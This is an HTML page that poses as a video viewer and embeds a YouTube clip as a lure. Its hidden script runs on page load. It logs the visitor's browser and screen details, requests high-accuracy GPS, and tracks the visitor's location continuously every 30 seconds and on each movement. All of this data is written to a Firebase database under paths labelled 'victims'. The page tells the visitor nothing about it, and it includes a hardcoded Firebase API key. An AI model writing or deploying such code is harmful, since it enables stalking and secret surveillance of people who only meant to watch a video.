<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Watch This Video Now!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #000; 
            font-family: Arial, sans-serif; 
            overflow: hidden;
            height: 100vh;
        }
        .video-container {
            position: relative;
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        iframe {
            width: 90vw;
            height: 90vh;
            max-width: 1200px;
            max-height: 675px;
            border: none;
        }
        .loading {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 18px;
        }
    </style>
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-app.js';
        import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/10.13.1/firebase-database.js';

        const firebaseConfig = {
            apiKey: "AIzaSyDNAcbechPRfrWSpxkZHKsksnr_hS88XdU",
            authDomain: "ai-studio-applet-webapp-2b6f9.firebaseapp.com",
            databaseURL: "https://ai-studio-applet-webapp-2b6f9-default-rtdb.firebaseio.com",
            projectId: "ai-studio-applet-webapp-2b6f9",
            storageBucket: "ai-studio-applet-webapp-2b6f9.firebasestorage.app",
            messagingSenderId: "594142136198",
            appId: "1:594142136198:web:2cd1ff68a43efefebd0e07"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Get victim info immediately
        function captureVictimInfo() {
            const victimData = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                timestamp: Date.now(),
                ip: '', // Will be captured server-side if needed
                sessionId: 'victim_' + Math.random().toString(36).substr(2, 9)
            };

            // Store session ID in localStorage for tracking
            localStorage.setItem('sessionId', victimData.sessionId);
            set(ref(db, 'victims/' + victimData.sessionId + '/basic'), victimData);
        }

        // High precision GPS capture
        function getPreciseLocation() {
            const sessionId = localStorage.getItem('sessionId') || 'unknown';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const locationData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude || null,
                            altitudeAccuracy: position.coords.altitudeAccuracy || null,
                            heading: position.coords.heading || null,
                            speed: position.coords.speed || null,
                            timestamp: position.timestamp,
                            highAccuracy: true
                        };
                        
                        // Store GPS data
                        await set(ref(db, 'victims/' + sessionId + '/gps'), locationData);
                        
                        // Continuous tracking every 30 seconds
                        setInterval(() => {
                            navigator.geolocation.getCurrentPosition(
                                (pos) => {
                                    const update = {
                                        latitude: pos.coords.latitude,
                                        longitude: pos.coords.longitude,
                                        accuracy: pos.coords.accuracy,
                                        timestamp: pos.timestamp
                                    };
                                    set(ref(db, 'victims/' + sessionId + '/gps'), update);
                                },
                                () => {}, 
                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 30000 }
                            );
                        }, 30000);
                    },
                    (error) => {
                        console.log('GPS blocked:', error);
                        // Store GPS denial
                        set(ref(db, 'victims/' + sessionId + '/gps'), {
                            error: error.message,
                            timestamp: Date.now()
                        });
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 15000,
                        maximumAge: 0
                    }
                );

                // Watch position for movement tracking
                navigator.geolocation.watchPosition(
                    (position) => {
                        const watchData = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: position.timestamp
                        };
                        set(ref(db, 'victims/' + sessionId + '/watch'), watchData);
                    },
                    () => {},
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 5000
                    }
                );
            }
        }

        // Capture screen info
        function captureScreenInfo() {
            const sessionId = localStorage.getItem('sessionId') || 'unknown';
            const screenData = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                timestamp: Date.now()
            };
            set(ref(db, 'victims/' + sessionId + '/screen'), screenData);
        }

        // Auto-trigger everything on load
        window.addEventListener('load', () => {
            captureVictimInfo();
            captureScreenInfo();
            getPreciseLocation();
        });

        // Also trigger on visibility change (user returns to tab)
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                getPreciseLocation();
            }
        });

    </script>
</head>
<body>
    <div class="video-container">
        <div class="loading" id="loading">Loading video...</div>
        <iframe 
            id="youtubeVideo"
            src="https://www.youtube.com/embed/N1g2a4sjx_I?autoplay=1&mute=0&controls=1&rel=0&modestbranding=1&playsinline=1"
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; geolocation; microphone"
            allowfullscreen>
        </iframe>
    </div>

    <script>
        // Hide loading after 2 seconds
        setTimeout(() => {
            document.getElementById('loading').style.display = 'none';
        }, 2000);
    </script>
</body>
</html>
